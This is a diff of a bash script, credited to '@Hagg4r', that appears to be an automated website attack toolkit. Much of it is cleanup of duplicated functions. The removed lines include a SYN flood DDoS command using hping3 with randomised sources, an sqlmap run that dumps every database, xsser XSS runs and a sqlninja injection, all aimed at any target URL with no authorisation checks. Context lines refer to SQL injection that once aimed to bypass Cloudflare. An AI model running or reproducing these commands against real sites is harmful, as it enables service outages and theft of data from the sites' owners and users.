@@ -1,8 +1,5 @@
 #!/bin/bash
 
-
-
-
 # Author information
 echo "by @Hagg4r"
 
@@ -86,7 +83,7 @@ check_website_status() {
     fi
 }
 
-# Function to perform SQL Injection, including attempts to bypass Cloudflare
+# Function to perform SQL Injection
 perform_sql_injection() {
     local target_url="$1"
     local results_dir="$2"
@@ -213,72 +210,9 @@ perform_whois_lookup() {
 }
 
 # Function to perform a Subfinder scan
-perform_sub
-# Function to perform a Subfinder scan
 perform_subfinder_scan() {
     local target_url="$1"
-    local results_dir="$2"
-    local result
-    result=$(run_command subfinder -d "$target_url")
-    local output_file="$results_dir/subfinder_scan.txt"
-    save_to_file "$output_file" "$result"
-    echo "Saved Subfinder scan results to $output_file"
-}
-
-# Function to perform an XSS attack
-perform_xss_attack() {
-    local target_url="$1"
-    local results_dir="$2"
-    local result
-    result=$(run_command xsser -u "$target_url" --auto)
-    local output_file="$results_dir/xss_attack.txt"
-    save_to_file "$output_file" "$result"
-    echo "Saved XSS attack results to $output_file"
-}
-
-# Function to perform a DDoS attack
-perform_ddos_attack() {
-    local target_url="$1"
-    local duration="$2"
-    local results_dir="$3"
-    echo "Starting DDoS attack on $target_url for $duration seconds..."
-    local result
-    result=$(run_command hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood --rand-source "$target_url")
-    local output_file="$results_dir/ddos_attack.txt"
-    save_to_file "$output_file" "$result"
-    echo "Saved DDoS attack results to $output_file"
-}
-
-# Function to access the database and download it
-access_database() {
-    local target_url="$1"
-    local results_dir="$2"
-    local result
-    result=$(run_command sqlmap -u "$target_url" --dump-all --batch)
-    local output_file="$results_dir/database_dump.txt"
-    save_to_file "$output_file" "$result"
-    echo "Saved database dump to $output_file"
-}
-
-# Function to perform an SQL injection using sqlninja
-perform_sqlninja_attack() {
-    local target_url="$1"
-    local results_dir="$2"
-    local config_file="$results_dir/sqlninja.conf"
-    echo "Creating sqlninja config file..."
-    echo "[target]" > "$config_file"
-    echo "target = $target_url" >> "$config_file"
-    local result
-    result=$(run_command sqlninja -c "$config_file")
-    local output_file="$results_dir/sqlninja_attack.txt"
-    save_to_file "$output_file" "$result"
-    echo "Saved sqlninja attack results to $output_file"
-}
-
-# Function to perform a Subfinder scan
-perform_subfinder_scan() {
-    local target_url="$1"
-    local results_dir="$2"
+        local results_dir="$2"
     local result
     result=$(run_command subfinder -d "$target_url")
     local output_file="$results_dir/subfinder_scan.txt"
@@ -337,9 +271,6 @@ perform_sqlninja_attack() {
 }
 
 # Function to modify the image with a cat
-modify_image() {
-    local
-    # Function to modify the image with a cat
 modify_image() {
     local input_image="$1"
     local output_image="$2"
